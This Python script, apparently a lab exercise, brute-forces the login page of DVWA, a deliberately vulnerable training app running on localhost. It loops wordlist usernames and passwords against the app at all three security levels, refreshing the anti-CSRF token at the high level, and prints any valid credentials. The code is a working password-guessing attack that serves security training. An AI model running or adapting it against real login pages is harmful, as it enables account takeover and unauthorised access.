"""
Task 4 automation — brute force for all 3 DVWA levels.
Run: python3 bruteforce_auto.py [low|medium|high|all]
Uses wordlists in ../wordlists/.
"""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "automation"))
from dvwa_client import DVWAClient

BASE = "http://127.0.0.1:4280"
WORDLIST_DIR = Path(__file__).resolve().parent.parent / "wordlists"


def load_list(name: str):
    return (WORDLIST_DIR / name).read_text().splitlines()


def is_success(html: str) -> bool:
    return "Welcome to the password protected area" in html


def run(level: str):
    client = DVWAClient(BASE)
    client.login()
    client.set_security(level)

    usernames = load_list("usernames.txt")
    passwords = load_list("passwords.txt")
    path = "/vulnerabilities/brute/"

    for u in usernames:
        for p in passwords:
            params = {"username": u, "password": p, "Login": "Login"}
            if level == "high":
                params["user_token"] = client.fresh_token(path)
            r = client.s.get(f"{BASE}{path}", params=params)
            if is_success(r.text):
                print(f"[{level.upper()}] VALID CREDS -> {u}:{p}")
                return
    print(f"[{level.upper()}] no match in wordlists — expand usernames.txt/passwords.txt")


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "all"
    levels = ["low", "medium", "high"] if target == "all" else [target]
    for lvl in levels:
        run(lvl)
